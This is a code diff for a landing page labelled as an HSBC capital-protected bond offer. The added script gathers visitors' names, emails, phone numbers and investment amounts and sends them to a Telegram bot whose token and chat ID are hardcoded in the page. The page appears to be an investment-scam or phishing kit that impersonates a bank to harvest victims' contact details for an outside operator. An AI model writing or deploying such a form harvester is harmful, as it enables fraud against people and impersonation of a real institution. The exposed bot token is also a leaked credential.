@@ -26,8 +26,99 @@ document.addEventListener('DOMContentLoaded', function() {
     });
     
     const form = document.querySelector('.investment-form');
-    form.addEventListener('submit', (e) => {
+    const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
+    const CHAT_ID = '-1002416566645';
+
+    // Phone validation function
+    function isValidPhone(countryCode, phone) {
+        const countryCodePattern = /^\+\d{1,4}$/;
+        const phonePattern = /^\d{6,14}$/;
+        return countryCodePattern.test(countryCode) && phonePattern.test(phone);
+    }
+
+    const countryCodeInput = document.getElementById('countryCode');
+
+    // Auto-add + and handle input
+    countryCodeInput.addEventListener('input', (e) => {
+        let value = e.target.value;
+        
+        // Remove any non-digits
+        value = value.replace(/\D/g, '');
+        
+        // Limit to 3 digits
+        value = value.slice(0, 3);
+        
+        // Add the + prefix
+        e.target.value = value;
+    });
+
+    form.addEventListener('submit', async (e) => {
         e.preventDefault();
+
+        const investment = form.querySelector('select').value;
+        const name = form.querySelector('input[type="text"]').value;
+        const email = form.querySelector('input[type="email"]').value;
+        const countryCode = '+' + document.getElementById('countryCode').value;
+        const phoneNumber = document.getElementById('phoneNumber').value;
+
+        // Validation
+        if (!investment || !name || !email || !countryCode || !phoneNumber) {
+            alert('Please fill in all fields');
+            return;
+        }
+
+        // Email validation
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailPattern.test(email)) {
+            alert('Please enter a valid email address');
+            return;
+        }
+
+        // Phone validation
+        if (!isValidPhone(countryCode, phoneNumber)) {
+            alert('Please enter a valid country code and phone number');
+            return;
+        }
+
+        const fullPhone = `${countryCode}${phoneNumber}`;
+        
+        const message = `
+🔔 New Brochure Request
+
+💰 Investment Amount: ${investment}
+👤 Full Name: ${name}
+📧 Email: ${email}
+📱 Phone: ${countryCode}${phoneNumber}
+
+From: HSBC Capital Protected Bond Landing Page
+        `;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    disable_web_page_preview: true
+                })
+            });
+
+            const data = await response.json();
+
+            if (data.ok) {
+                form.reset();
+                alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
+            } else {
+                console.error('Telegram Error:', data);
+                throw new Error(data.description || 'Failed to send message');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('Something went wrong. Please try again later.');
+        }
     });
 });
 
